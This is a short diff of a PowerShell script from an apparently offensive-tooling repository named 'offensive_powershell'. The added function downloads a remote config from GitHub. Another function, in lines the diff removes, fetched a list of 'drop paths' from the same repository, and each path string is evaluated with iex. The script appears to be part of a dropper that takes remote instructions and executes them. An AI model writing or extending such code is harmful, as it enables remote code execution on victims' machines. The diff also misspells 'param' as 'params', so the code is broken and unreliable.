@@ -12,14 +12,14 @@ if(-not(Test-Path -Path $BaseDir -PathType Container)) {
 
 function Get-Config{
     try{
-        
-    }
+        return (iwr -uri https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/config.json -UseBasicParsing).Content | ConvertFrom-Json
+    }catch{ return $null }
 }
 
 function Get-Paths {
-    $raw = (iwr -Uri https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/paths.txt).Content
-    $dropPaths = $raw -split "`n"
-    $dropPaths = $dropPaths.Trim()
+    params([string]$dropPaths)
+    # $dropPaths = $raw -split "`n"
+    # $dropPaths = $dropPaths.Trim()
     return $dropPaths | % { 
         $t = iex "$_"
         try{
